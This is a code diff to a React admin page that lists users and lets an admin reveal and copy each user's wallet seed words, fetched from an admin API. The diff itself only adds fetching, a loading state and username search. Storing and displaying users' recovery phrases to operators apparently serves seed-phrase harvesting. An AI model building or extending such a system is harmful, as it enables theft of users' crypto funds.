@@ -1,17 +1,15 @@
 "use client"
 
-import { useState, useMemo } from "react"
+import { useState, useMemo, useEffect } from "react"
 import { Button } from "@/components/ui/button"
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
 import { Input } from "@/components/ui/input"
 import { Badge } from "@/components/ui/badge"
 import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
-import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog"
 import { Alert, AlertDescription } from "@/components/ui/alert"
-import { Search, Eye, EyeOff, Copy, Shield, Key, Users, AlertTriangle, CheckCircle } from "lucide-react"
+import { Search, Eye, EyeOff, Copy, Shield, Key, AlertTriangle } from "lucide-react"
 import { toast } from "sonner"
 import AdminTopNav from "../_components/AdminTopNav"
-
 
 export default function SeedWordsPage({ initialUsers }) {
   const [users, setUsers] = useState(initialUsers)
@@ -19,13 +17,32 @@ export default function SeedWordsPage({ initialUsers }) {
   const [visibleSeeds, setVisibleSeeds] = useState(new Set())
   const [selectedUser, setSelectedUser] = useState(null)
   const [loadingApproval, setLoadingApproval] = useState({ userId: null, itemType: null })
+  const [loading, setLoading] = useState(false)
+
+  // Fetch updated users on mount
+  useEffect(() => {
+    const fetchUsers = async () => {
+      setLoading(true)
+      try {
+        const res = await fetch("/api/admin/get-user-seeds")
+        const data = await res.json()
+        setUsers(data.users)
+      } catch (err) {
+        toast("Failed to fetch users")
+      } finally {
+        setLoading(false)
+      }
+    }
+    fetchUsers()
+  }, [])
 
   // Filter users based on search term
   const filteredUsers = useMemo(() => {
     return users.filter(
       (user) =>
-        user.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
-        user.email.toLowerCase().includes(searchTerm.toLowerCase()),
+        (user.username?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+        user.name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+        user.email?.toLowerCase().includes(searchTerm.toLowerCase()))
     )
   }, [users, searchTerm])
 
@@ -52,7 +69,7 @@ export default function SeedWordsPage({ initialUsers }) {
       await navigator.clipboard.writeText(text)
       toast(`${type} copied to clipboard`)
     } catch (err) {
-      toast( "Failed to copy to clipboard")
+      toast("Failed to copy to clipboard")
     }
   }
 
@@ -74,7 +91,6 @@ export default function SeedWordsPage({ initialUsers }) {
     }
   }
 
-  
   const handleApproval = async (userId, itemType, status) => {
     setLoadingApproval({ userId, itemType });
     try {
@@ -103,6 +119,15 @@ export default function SeedWordsPage({ initialUsers }) {
     }
   };
 
+  if (loading) {
+    return (
+      <div className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-br from-gray-950 via-gray-900 to-black text-white">
+        <Key className="h-12 w-12 animate-spin mb-4 text-blue-400" />
+        <p className="text-lg text-gray-400">Loading users...</p>
+      </div>
+    )
+  }
+
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-950 via-gray-900 to-black text-white">
       <div className="container mx-auto p-4 sm:p-6">
@@ -123,7 +148,7 @@ export default function SeedWordsPage({ initialUsers }) {
           <div className="relative max-w-md">
             <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
             <Input
-              placeholder="Search users by name or email..."
+              placeholder="Search users by username, name or email..."
               value={searchTerm}
               onChange={(e) => setSearchTerm(e.target.value)}
               className="pl-10 bg-gray-800/50 border-gray-700 text-white placeholder-gray-400"
@@ -138,13 +163,15 @@ export default function SeedWordsPage({ initialUsers }) {
               <CardHeader className="pb-3">
                 <div className="flex items-start gap-3">
                   <Avatar className="h-10 w-10 sm:h-12 sm:w-12">
-                    <AvatarImage src={user.avatar || "/placeholder.svg"} alt={user.name} />
+                    <AvatarImage src={user.avatar || "/placeholder.svg"} alt={user.username || user.name} />
                     <AvatarFallback className="bg-gray-700">
-                      {user.name.split(" ").map((n) => n[0]).join("")}
+                      {(user.username || user.name || "").split(" ").map((n) => n[0]).join("")}
                     </AvatarFallback>
                   </Avatar>
                   <div className="min-w-0 flex-1">
-                    <CardTitle className="text-base sm:text-lg truncate">{user.name}</CardTitle>
+                    <CardTitle className="text-base sm:text-lg truncate">
+                      {user.username || user.name}
+                    </CardTitle>
                     <p className="text-xs sm:text-sm text-gray-400 truncate">{user.email}</p>
                     <Badge className={`mt-1 text-xs ${getStatusColor(user.status)}`}>{user.status}</Badge>
                   </div>
